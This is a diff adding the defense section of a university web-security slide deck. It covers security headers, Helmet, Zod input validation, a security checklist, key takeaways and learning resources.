+        <div class="part-indicator">Part VI</div>
+        <h2 class="section-title">Defense Strategies</h2>
+        <p class="section-subtitle">How to not be the next headline</p>
+        <div class="decorative-code safe-code">
+            <pre><code>if (!isSecure(code)) { rewrite(code); }</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- SECURITY HEADERS -->
+<section class="slide" data-slide="security-headers">
+    <div class="slide-content">
+        <h3 class="slide-title">Security Headers — Easy Wins</h3>
+        <p class="click-hint">Click any header for explanation</p>
+        <div class="headers-list">
+            <div class="header-item clickable" data-modal="header-hsts">
+                <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>
+                <p>Force HTTPS for 1 year</p>
+            </div>
+            <div class="header-item clickable" data-modal="header-cto">
+                <code>X-Content-Type-Options: nosniff</code>
+                <p>Prevent MIME type sniffing</p>
+            </div>
+            <div class="header-item clickable" data-modal="header-xfo">
+                <code>X-Frame-Options: DENY</code>
+                <p>Prevent clickjacking</p>
+            </div>
+            <div class="header-item clickable" data-modal="header-referrer">
+                <code>Referrer-Policy: strict-origin-when-cross-origin</code>
+                <p>Control referrer information leakage</p>
+            </div>
+            <div class="header-item clickable" data-modal="header-permissions">
+                <code>Permissions-Policy: geolocation=(), camera=()</code>
+                <p>Disable browser features you don't use</p>
+            </div>
+        </div>
+        <div class="code-showcase compact">
+            <div class="code-tab">Express.js with Helmet</div>
+            <pre class="code-block"><code>import helmet from 'helmet';
+app.use(helmet());  // Sets all secure headers!</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- INPUT VALIDATION -->
+<section class="slide" data-slide="input-validation">
+    <div class="slide-content">
+        <h3 class="slide-title">Input Validation — Trust Nothing</h3>
+        <div class="validation-principles">
+            <div class="principle">
+                <h4>1. Validate on Server</h4>
+                <p>Client-side validation is for UX. Server-side is for security.</p>
+            </div>
+            <div class="principle">
+                <h4>2. Whitelist, Don't Blacklist</h4>
+                <p>Define what's allowed, reject everything else.</p>
+            </div>
+            <div class="principle">
+                <h4>3. Validate Type, Length, Format, Range</h4>
+                <p>email: string, max 254 chars, valid format</p>
+            </div>
+        </div>
+        <div class="code-showcase">
+            <div class="code-tab safe">Zod Validation Example</div>
+            <pre class="code-block"><code>import { z } from 'zod';
+
+const UserSchema = z.object({
+    email: z.string().email().max(254),
+    password: z.string().min(8).max(100),
+    age: z.number().int().min(13).max(120),
+    username: z.string().regex(/^[a-zA-Z0-9_]+$/).max(30),
+});
+
+// In your route
+const result = UserSchema.safeParse(req.body);
+if (!result.success) {
+    return res.status(400).json({ errors: result.error.issues });
+}</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- SECURITY CHECKLIST -->
+<section class="slide" data-slide="checklist">
+    <div class="slide-content">
+        <h3 class="slide-title">Security Checklist</h3>
+        <div class="checklist-columns">
+            <div class="checklist-section">
+                <h4>Authentication</h4>
+                <ul class="security-checklist">
+                    <li>[ ] bcrypt/Argon2 for passwords</li>
+                    <li>[ ] Rate limiting on login</li>
+                    <li>[ ] Secure session cookies</li>
+                    <li>[ ] CSRF protection</li>
+                    <li>[ ] Multi-factor authentication</li>
+                </ul>
+            </div>
+            <div class="checklist-section">
+                <h4>Data Protection</h4>
+                <ul class="security-checklist">
+                    <li>[ ] HTTPS everywhere</li>
+                    <li>[ ] Parameterized queries</li>
+                    <li>[ ] Input validation (server-side)</li>
+                    <li>[ ] Output encoding</li>
+                    <li>[ ] Encrypt sensitive data at rest</li>
+                </ul>
+            </div>
+            <div class="checklist-section">
+                <h4>Infrastructure</h4>
+                <ul class="security-checklist">
+                    <li>[ ] Security headers (Helmet)</li>
+                    <li>[ ] CSP configured</li>
+                    <li>[ ] Dependencies updated</li>
+                    <li>[ ] .git/.env not exposed</li>
+                    <li>[ ] Error messages sanitized</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- SUMMARY -->
+<section class="slide" data-slide="summary">
+    <div class="slide-content">
+        <h3 class="slide-title">Key Takeaways</h3>
+        <div class="takeaways">
+            <div class="takeaway">
+                <span class="takeaway-num">01</span>
+                <div class="takeaway-text">
+                    <strong>Never trust user input</strong>
+                    <p>Validate everything. Use parameterized queries. Encode output.</p>
+                </div>
+            </div>
+            <div class="takeaway">
+                <span class="takeaway-num">02</span>
+                <div class="takeaway-text">
+                    <strong>Authentication is hard — use proven libraries</strong>
+                    <p>bcrypt for passwords, established session libraries, MFA when possible.</p>
+                </div>
+            </div>
+            <div class="takeaway">
+                <span class="takeaway-num">03</span>
+                <div class="takeaway-text">
+                    <strong>Defense in depth</strong>
+                    <p>Multiple layers: validation, authentication, authorization, encryption, monitoring.</p>
+                </div>
+            </div>
+            <div class="takeaway">
+                <span class="takeaway-num">04</span>
+                <div class="takeaway-text">
+                    <strong>Security is a process, not a product</strong>
+                    <p>Keep dependencies updated. Monitor logs. Have an incident response plan.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE -->
+<section class="slide" data-slide="end">
+    <div class="slide-content title-slide">
+        <h2 class="end-title">Questions?</h2>
+        <div class="end-info">
+            <p class="course">Full Stack Engineering</p>
+            <p class="instructor">Ohad Assulin — RU</p>
+        </div>
+        <div class="end-resources">
+            <h4>Resources</h4>
+            <ul>
+                <li>OWASP Top 10 — owasp.org/Top10</li>
+                <li>PortSwigger Web Security Academy — Free labs</li>
+                <li>HackTheBox — Practice hacking legally</li>
+                <li>Have I Been Pwned — Check if you've been breached</li>
+            </ul>
+        </div>
+    </div>
+</section>
